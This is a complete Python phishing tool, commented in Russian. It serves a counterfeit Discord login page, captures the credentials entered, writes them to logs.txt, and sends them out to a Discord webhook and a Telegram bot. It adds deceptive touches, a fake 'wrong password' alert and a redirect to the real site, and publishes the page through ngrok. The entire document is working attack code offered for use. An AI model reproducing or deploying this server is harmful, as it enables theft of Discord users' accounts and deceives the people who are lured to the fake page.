#!/usr/bin/env python3
# Фишинг сервер для сбора данных Discord

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import requests
import urllib.parse
import datetime

# Конфигурация отправки
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/ВАШ_ВЕБХУК"
TELEGRAM_TOKEN = "ВАШ_ТОКЕН"
TELEGRAM_CHAT = "ВАШ_CHAT_ID"

# HTML фишинг страница (замаскированная под Discord)
PHISHING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Discord - безопасный вход</title>
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #7289da, #5865f2);
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            height: 100vh; display: flex; justify-content: center; align-items: center;
        }
        .login-card {
            background: #36393f; border-radius: 8px; width: 480px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.5); padding: 32px;
        }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo svg { width: 130px; height: 36px; }
        h2 { color: #fff; font-size: 26px; line-height: 32px; font-weight: 300; text-align: center; }
        .subtitle { color: #b9bbbe; font-size: 16px; line-height: 20px; text-align: center; margin: 8px 0 24px; }
        .input-group { margin-bottom: 20px; }
        label { color: #b9bbbe; font-size: 12px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase; }
        input {
            width: 100%; padding: 12px; margin-top: 8px; background: #202225;
            border: 1px solid #040405; border-radius: 4px; color: #fff;
            font-size: 16px; transition: border-color .2s ease;
        }
        input:focus { border-color: #5865f2; outline: none; }
        button {
            width: 100%; padding: 14px; background: #5865f2; color: #fff;
            border: none; border-radius: 4px; font-size: 16px; font-weight: 500;
            cursor: pointer; transition: background .2s ease;
        }
        button:hover { background: #4752c4; }
        .qr-link { text-align: center; margin-top: 16px; }
        .qr-link a { color: #00aff4; text-decoration: none; font-size: 14px; }
        .qr-link a:hover { text-decoration: underline; }
        .footer { text-align: center; margin-top: 20px; color: #4f545c; font-size: 12px; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo">
            <svg viewBox="0 0 40 40">
                <circle cx="20" cy="20" r="20" fill="#5865f2"/>
            </svg>
        </div>
        <h2>Добро пожаловать!</h2>
        <div class="subtitle">Войдите в свой аккаунт Discord</div>
        
        <div class="input-group">
            <label>ЭЛЕКТРОННАЯ ПОЧТА ИЛИ НОМЕР ТЕЛЕФОНА</label>
            <input type="text" id="email" placeholder="example@mail.com" autocomplete="off">
        </div>
        
        <div class="input-group">
            <label>ПАРОЛЬ</label>
            <input type="password" id="password" placeholder="··················">
        </div>
        
        <button onclick="login()">Войти</button>
        
        <div class="qr-link">
            <a href="#">Войти через QR-код</a>
        </div>
        
        <div class="footer">
            <span>Нужна помощь? · Зарегистрироваться</span>
        </div>
    </div>

    <script>
        function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (email && password) {
                // Отправляем данные на наш сервер
                fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        email: email, 
                        password: password,
                        url: window.location.href,
                        userAgent: navigator.userAgent
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        // Перенаправляем на настоящий Discord после сбора данных
                        window.location.href = 'https://discord.com/login';
                    }
                });
                
                // Показываем ошибку для правдоподобности
                alert('Неверный email или пароль. Попробуйте еще раз.');
                document.getElementById('password').value = '';
            } else {
                alert('Пожалуйста, заполните все поля');
            }
        }
    </script>
</body>
</html>
"""

class PhishingHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Отключаем стандартное логирование
    
    def send_to_webhook(self, data):
        """Отправка данных в Discord вебхук"""
        webhook_data = {
            "content": f"**🔴 НОВЫЕ ДАННЫЕ**\n```json\n{json.dumps(data, indent=2, ensure_ascii=False)}\n```",
            "username": "Phish Logger"
        }
        try:
            requests.post(DISCORD_WEBHOOK, json=webhook_data)
        except:
            pass
    
    def send_to_telegram(self, data):
        """Отправка данных в Telegram"""
        text = f"🔴 НОВЫЙ ЛОГИН\nEmail: {data.get('email')}\nPassword: {data.get('password')}\nIP: {data.get('ip')}\nUA: {data.get('userAgent')}"
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        try:
            requests.post(url, json={"chat_id": TELEGRAM_CHAT, "text": text})
        except:
            pass
    
    def do_GET(self):
        """Отдаем фишинг страницу"""
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(PHISHING_PAGE.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Получаем данные с формы"""
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Добавляем IP и время
            data['ip'] = self.client_address[0]
            data['timestamp'] = str(datetime.datetime.now())
            
            # Сохраняем в файл
            with open('logs.txt', 'a', encoding='utf-8') as f:
                f.write(json.dumps(data, ensure_ascii=False) + '\n')
            
            # Отправка в Telegram/Webhook
            if DISCORD_WEBHOOK and DISCORD_WEBHOOK != "https://discord.com/api/webhooks/ВАШ_ВЕБХУК":
                self.send_to_webhook(data)
            
            if TELEGRAM_TOKEN and TELEGRAM_TOKEN != "ВАШ_ТОКЕН":
                self.send_to_telegram(data)
            
            # Отправляем ответ
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"success": True}).encode())
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

def create_ngrok_link():
    """Создание публичной ссылки через ngrok"""
    try:
        import subprocess
        import time
        import requests
        
        # Запускаем ngrok в фоне
        subprocess.Popen(['ngrok', 'http', '8080'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        
        # Получаем публичную ссылку
        response = requests.get('http://localhost:4040/api/tunnels')
        tunnels = response.json()
        public_url = tunnels['tunnels'][0]['public_url']
        return public_url
    except:
        return "http://localhost:8080"

def main():
    print("""
    ╔═══════════════════════════════════════════╗
    ║     PHISHING SERVER v2.0 - LEDIAN         ║
    ║     Генерация рабочей фишинг ссылки       ║
    ╚═══════════════════════════════════════════╝
    """)
    
    # Настройка отправки
    print("Настройте способ получения данных:")
    use_webhook = input("Использовать Discord Webhook? (y/n): ").lower() == 'y'
    if use_webhook:
        global DISCORD_WEBHOOK
        DISCORD_WEBHOOK = input("Введите URL вебхука Discord: ")
    
    use_telegram = input("Использовать Telegram бота? (y/n): ").lower() == 'y'
    if use_telegram:
        global TELEGRAM_TOKEN, TELEGRAM_CHAT
        TELEGRAM_TOKEN = input("Введите токен Telegram бота: ")
        TELEGRAM_CHAT = input("Введите ваш Chat ID: ")
    
    # Запуск сервера
    server = HTTPServer(('0.0.0.0', 8080), PhishingHandler)
    
    print("\n" + "="*60)
    print("✅ СЕРВЕР ЗАПУЩЕН!")
    print("="*60)
    
    # Создание локальной ссылки
    local_ip = requests.get('https://api.ipify.org').text
    print(f"\n📌 Локальная ссылка: http://localhost:8080")
    print(f"📌 Локальный IP: http://{local_ip}:8080")
    
    # Попытка создать ngrok ссылку
    try:
        public_url = create_ngrok_link()
        print(f"📌 Публичная ссылка (через ngrok): {public_url}")
        print(f"📌 Фишинг ссылка: {public_url}/")
    except:
        print("\n⚠️  Для публичной ссылки установите ngrok:")
        print("   в ISH: apk add ngrok  или  wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip")
        print("   затем: ngrok http 8080")
    
    print("\n" + "="*60)
    print("📁 Логи сохраняются в: logs.txt")
    print("📊 Данные приходят сюда же в консоль")
    print("="*60)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n❌ Сервер остановлен")

if __name__ == '__main__':
    main()
